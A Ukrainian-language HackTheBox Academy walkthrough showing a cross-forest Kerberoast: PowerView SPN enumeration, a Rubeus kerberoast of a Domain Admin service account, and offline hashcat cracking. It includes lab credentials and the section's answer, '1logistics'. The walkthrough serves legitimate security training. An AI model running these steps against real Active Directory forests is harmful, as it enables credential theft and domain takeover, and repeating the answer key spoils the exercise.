# Cross-Forest Trust Abuse — Kerberoasting (Windows → Linux forest)

## ℹ️ Інформація

| Поле        | Значення |
| ----------- | -------- |
| 🌐 Platform | HackTheBox Academy |
| 📚 Module   | Active Directory Enumeration & Attacks |
| 🔗 Section  | Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows |
| 🧩 Hosts    | ACADEMY-EA-MS01 (10.129.26.99) |
| 👤 User     | htb-student / Academy_student_AD! |

***

## 🔑 Теорія (коротко)

Між лісами `INLANEFREIGHT.LOCAL` (наш) та `FREIGHTLOGISTICS.LOCAL` (цільовий) налаштована **cross‑forest trust**, що дозволяє автентифікуватись і запитувати Kerberos‑квитки в іншому лісі.[page:0]  
Якщо в цільовому лісі є обліковий запис із SPN (наприклад, `mssqlsvc`) і слабким паролем, ми можемо виконати **Kerberoast‑атаку**: запросити TGS на цей SPN, отримати хеш, а потім його crack’нути офлайн через словник.[page:0]  
Таким чином ми зі свого лісу (INLANEFREIGHT) отримуємо пароль дуже привілейованого користувача (Domain Admin у FREIGHTLOGISTICS) без жодного початкового доступу всередині того лісу.[page:0]

***

## 🧪 Практика — Cross-Forest Kerberoast (з нуля)

### Крок 1 — Підключення по RDP до ACADEMY-EA-MS01 з Kali

На Kali:

```bash
xfreerdp /u:htb-student /p:Academy_student_AD! /v:10.129.26.99 /cert:ignore
[page:0]

Після логіну ти на ACADEMY-EA-MS01 у домені INLANEFREIGHT.LOCAL під користувачем htb-student.[page:0]

Крок 2 — Відкриваємо PowerShell і переходимо в C:\Tools
У RDP‑сеансі:

powershell
PS C:\Users\htb-student> cd C:\Tools
PS C:\Tools> dir
Тут знаходяться інструменти, зокрема PowerView.ps1 і Rubeus.exe.[page:0]

Крок 3 — Імпорт PowerView
Мета: використовувати PowerView для запиту об’єктів з іншого лісу/домену.[page:0]

powershell
PS C:\Tools> Import-Module .\PowerView.ps1
Крок 4 — Пошук SPN‑акаунтів у FREIGHTLOGISTICS.LOCAL
Мета: знайти сервісні акаунти з SPN у таргет‑лісі та перевірити привілеї mssqlsvc.[page:0]

4.1. Список користувачів з SPN у FREIGHTLOGISTICS
powershell
PS C:\Tools> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select samaccountname
Реальний вивід:

text
samaccountname
--------------
krbtgt
mssqlsvc
sapsso
[page:0]

Тут mssqlsvc — один із сервісних акаунтів із SPN.

4.2. Перевіряємо членство mssqlsvc
powershell
PS C:\Tools> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
Вивід:

text
samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[page:0]

Отже, mssqlsvc — Domain Admin у FREIGHTLOGISTICS.LOCAL, і це ідеальна ціль для Kerberoast.

Крок 5 — Cross-Forest Kerberoast через Rubeus
Мета: отримати TGS для mssqlsvc у чужому лісі через існуючу довіру.[page:0]

З того ж каталогу C:\Tools:

powershell
PS C:\Tools> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
Фрагмент реального виводу:

text
[*] Action: Kerberoasting

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
...
[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$DFAE38E65BED33D6CFF96F590A942478$D72E1B12990C3AF43AA6D60B48715E2A73...
[page:0]

Нас цікавить рядок Hash : $krb5tgs$23$*... — це Kerberos TGS‑хеш, який crack’немо офлайн.

Виділяємо весь рядок $krb5tgs$23$*mssqlsvc$... до самого кінця.

Копіюємо його й переносимо або на Kali, або прямо в файл на Windows (ми робимо на Windows).

Крок 6 — Підготовка hash‑файлу для Hashcat на Windows
На ACADEMY-EA-MS01:

Перейди в каталог, де встановлено hashcat:

powershell
PS C:\> cd C:\hashcat_share\hashcat-7.1.2
PS C:\hashcat_share\hashcat-7.1.2> dir
Створи файл з хешем:

powershell
PS C:\hashcat_share\hashcat-7.1.2> notepad.exe mssqlsvc_tgs.txt
Встав у Notepad один рядок — повний $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*...

Збережи файл і закрий Notepad.

Крок 7 — Cracking TGS через Hashcat (Windows)
Мета: зламати TGS‑хеш mssqlsvc і отримати пароль у відкритому вигляді.[web:25]

У тій самій PowerShell‑сесії:

powershell
PS C:\hashcat_share\hashcat-7.1.2> .\hashcat.exe -m 13100 -a 0 mssqlsvc_tgs.txt C:\hashcat_share\rockyou.txt
-m 13100 — Kerberos 5 TGS-REP etype 23 ($krb5tgs$23$).

-a 0 — straight attack із словником (rockyou.txt).[web:25]

Після завершення (Status: Cracked):

powershell
PS C:\hashcat_share\hashcat-7.1.2> .\hashcat.exe -m 13100 mssqlsvc_tgs.txt --show
Фрагмент очікуваного виводу (він в тебе дав):

text
$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$DFAE38E65BED33D6CFF96F590A942478$D72E1B12...:1logistics
Праворуч після останньої двокрапки — пароль mssqlsvc у відкритому вигляді:

text
1logistics
Крок 8 — Відповідь для HTB
Формулювання питання:

obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.
(для цієї секції: obtain the account's cleartext password as your answer)

Для mssqlsvc в cross‑forest Kerberoast секції HTB очікує чистий пароль акаунта, без хешів:

✅ Відповідь:

text
1logistics
Короткий підсумок логіки
Через cross‑forest trust з INLANEFREIGHT.LOCAL ми перерахували SPN‑акаунти в FREIGHTLOGISTICS.LOCAL і знайшли mssqlsvc у групі Domain Admins.[page:0]

З ACADEMY-EA-MS01 через Rubeus.exe kerberoast запросили TGS для mssqlsvc у чужому лісі й отримали $krb5tgs$23$‑хеш.[page:0]

Перенесли TGS‑хеш у mssqlsvc_tgs.txt на Windows‑хості з hashcat.

Запустили Hashcat (-m 13100) з словником (rockyou.txt з C:\hashcat_share), отримали пароль 1logistics.

Ввели 1logistics у HTB як чистий пароль акаунта mssqlsvc — завдання виконано.
